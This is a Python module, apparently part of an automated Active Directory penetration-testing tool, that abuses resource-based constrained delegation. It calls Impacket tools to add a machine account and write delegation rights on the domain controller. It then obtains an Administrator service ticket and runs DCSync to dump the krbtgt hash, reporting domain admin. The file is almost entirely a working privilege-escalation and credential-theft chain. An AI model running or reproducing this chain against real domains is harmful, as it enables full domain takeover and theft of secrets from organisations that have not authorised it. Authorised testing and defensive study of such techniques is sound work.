"""Kerberos delegation abuse: RBCD and unconstrained delegation.

RBCD (Resource-Based Constrained Delegation) is only attempted in
``--aggressive`` mode since it writes ``msDS-AllowedToActOnBehalfOfOtherIdentity``
on target computer objects.
"""
from __future__ import annotations

import re
from pathlib import Path

from .base import BaseModule


class DelegationModule(BaseModule):
    name = "delegation_abuse"
    description = "Abuse RBCD and unconstrained delegation"

    def run(self, workdir: Path) -> dict:
        auth = self._pick_auth()
        if not auth:
            return {}
        domain, user, pwd, nth = auth
        dc = self._dc()
        if not dc:
            return {}

        if self.aggressive_enabled("rbcd_write"):
            self._rbcd(workdir, domain, user, pwd, nth, dc)
        else:
            self.log.info("RBCD abuse disabled (use --aggressive to enable)")
        return {"domain_admin": self.state.domain_admin_achieved}

    def _pick_auth(self):
        creds = self.state.usable_credentials()
        if not creds:
            return None
        c = creds[0]
        return (c.domain or self.state.domain, c.username, c.password, c.nthash)

    def _dc(self) -> str | None:
        return (self.state.domain_controllers or [None])[0]

    # ------------------------------------------------------------------
    def _rbcd(self, workdir, domain, user, pwd, nth, dc) -> None:
        """Add a computer account, set RBCD on the DC, impersonate admin."""
        # 1. Create a machine account (requires MachineAccountQuota > 0)
        comp_name = self.config.get("general.computer_name", "ZEXEC$")
        comp_pass = self.config.get("general.computer_password", "Zexec@12345")
        add = self.runner.resolve("addcomputer", prefix="impacket-")
        args = [add, "-computer-name", comp_name, "-computer-pass", comp_pass,
                "-dc-ip", dc]
        if nth:
            args += ["-hashes", f"0x0:{nth}", f"{domain}/{user}"]
        else:
            args += [f"{domain}/{user}:{pwd or ''}"]
        res = self.runner.run(args, timeout=300, silent=True)
        if res.returncode != 0:
            self.log.info("could not add computer account (quota or perms)")
            return

        # 2. Write msDS-AllowedToActOnBehalfOfOtherIdentity on the DC
        rbcd = self.runner.resolve("rbcd", prefix="impacket-")
        args = [rbcd, "-delegate-from", comp_name, "-delegate-to", f"{dc}$",
                "-dc-ip", dc, "-action", "write"]
        if nth:
            args += ["-hashes", f"0x0:{nth}", f"{domain}/{user}"]
        else:
            args += [f"{domain}/{user}:{pwd or ''}"]
        res = self.runner.run(args, timeout=300, silent=True)
        if res.returncode != 0:
            self.log.debug("RBCD write failed (no write rights on DC)")
            return

        self.log_finding(
            "critical", "RBCD set on domain controller",
            f"{comp_name} can delegate to {dc}",
            technique="RBCD")

        # 3. Get a service ticket impersonating Administrator on the DC
        getst = self.runner.resolve("getST", prefix="impacket-")
        args = [getst, "-spn", f"cifs/{dc}", "-impersonate", "Administrator",
                "-dc-ip", dc, f"{domain}/{comp_name}:{comp_pass}"]
        res = self.runner.run(args, timeout=300, silent=True)
        if "Saved" in res.stdout or "ccache" in res.stdout:
            self.log.ok("obtained service ticket for %s as Administrator", dc)
            self.state.meta["rbcd_ticket"] = str(workdir / "Administrator.ccache")
            # Try DCSync with the ticket
            self._dcsync_ticket(domain, dc, workdir)

    def _dcsync_ticket(self, domain, dc, workdir) -> None:
        ticket = workdir / "Administrator.ccache"
        if not ticket.exists():
            return
        cmd = self.runner.resolve("secretsdump", prefix="impacket-")
        res = self.runner.run(
            ["env", f"KRB5CCNAME={ticket}", cmd, "-k", "-no-pass",
             f"{domain}/Administrator@{dc}", "-just-dc-user", "krbtgt"],
            timeout=300, silent=True)
        if "krbtgt" in res.stdout and ":" in res.stdout:
            self.state.domain_admin_achieved = True
            self.log.ok("DCSync via RBCD ticket — DOMAIN ADMIN achieved!")
